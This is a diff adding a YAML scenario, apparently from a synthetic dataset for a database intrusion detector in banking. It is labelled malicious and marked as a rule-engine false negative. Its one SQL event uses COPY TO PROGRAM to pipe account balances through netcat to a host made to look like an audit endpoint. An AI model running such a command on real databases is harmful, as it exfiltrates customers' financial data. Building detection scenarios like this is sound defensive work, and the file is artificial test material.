@@ -1,0 +1,29 @@
+scenario_id: gen_banking_97_copy_to_program_mal_2762m
+family_id: gen_banking_97_copy_to_program_fam_2762
+domain: banking
+time_of_day: 03:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'nc audit-intake.corp 443'
+    connects_to:
+      ip: 10.24.16.109
+      port: 22
+matched_pair_id: gen_banking_97_copy_to_program_pair_2762
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
